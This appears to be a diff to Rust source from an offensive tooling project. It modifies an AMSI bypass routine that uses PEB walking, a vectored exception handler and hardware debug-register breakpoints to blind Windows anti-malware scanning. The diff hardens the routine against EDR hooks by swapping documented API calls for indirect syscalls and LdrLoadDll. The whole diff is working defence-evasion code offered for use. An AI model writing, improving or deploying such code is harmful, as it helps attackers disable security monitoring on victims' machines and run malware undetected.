@@ -1,14 +1,9 @@
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::{
     Foundation::EXCEPTION_SINGLE_STEP,
-    System::{
-        Diagnostics::Debug::{
-            AddVectoredExceptionHandler, EXCEPTION_POINTERS,
-            SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
-        },
-        Threading::GetCurrentThread,
-        // LoadLibraryA is still needed to force amsi.dll into memory.
-        LibraryLoader::LoadLibraryA,
+    System::Diagnostics::Debug::{
+        AddVectoredExceptionHandler, EXCEPTION_POINTERS,
+        CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
     },
 };
 
@@ -27,12 +22,12 @@ pub unsafe fn install_amsi_bypass() {
 
     const AMSI_H: u32 = djb2_hash_lower(b"amsi.dll");
 
-    // Try PEB first; if not loaded, force-load then re-check PEB.
+    // Try PEB first; if not loaded, force-load via LdrLoadDll then re-check PEB.
     #[cfg(target_arch = "x86_64")]
     let amsi_base: *const u8 = {
         let b = peb_get_module_base(AMSI_H);
         if b.is_null() {
-            LoadLibraryA(b"amsi.dll\0".as_ptr());
+            crate::evasion::module_stomp::ldr_load_dll_by_name(b"amsi.dll\0");
             let b2 = peb_get_module_base(AMSI_H);
             if b2.is_null() { return; }
             b2
@@ -43,7 +38,7 @@ pub unsafe fn install_amsi_bypass() {
         use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
         let mut h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
         if h.is_null() {
-            LoadLibraryA(b"amsi.dll\0".as_ptr());
+            windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr());
             h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
             if h.is_null() { return; }
         }
@@ -64,12 +59,15 @@ pub unsafe fn install_amsi_bypass() {
         None    => 0,
     };
 
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
     AddVectoredExceptionHandler(1, Some(amsi_veh_handler));
 
-    let thread = GetCurrentThread();
+    let thread: isize = !1isize; // -2 = current thread pseudo-handle
     let mut ctx: CONTEXT = core::mem::zeroed();
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
-    GetThreadContext(thread, &mut ctx);
+    if let Some((ssn_get, tramp_get)) = get_ssn(b"NtGetContextThread") {
+        indirect_syscall(ssn_get, tramp_get, thread as usize, &mut ctx as *mut CONTEXT as usize, 0, 0, 0, 0);
+    }
     ctx.Dr0  = AMSI_ADDR as u64;
     ctx.Dr7 |= 0x1;
     if AMSI_SCAN_STRING_ADDR != 0 {
@@ -80,7 +78,9 @@ pub unsafe fn install_amsi_bypass() {
         ctx.Dr3  = AMSI_OPEN_SESSION_ADDR as u64;
         ctx.Dr7 |= 0x40;
     }
-    SetThreadContext(thread, &ctx);
+    if let Some((ssn_set, tramp_set)) = get_ssn(b"NtSetContextThread") {
+        indirect_syscall(ssn_set, tramp_set, thread as usize, &ctx as *const CONTEXT as usize, 0, 0, 0, 0);
+    }
 }
 
 #[cfg(target_os = "windows")]
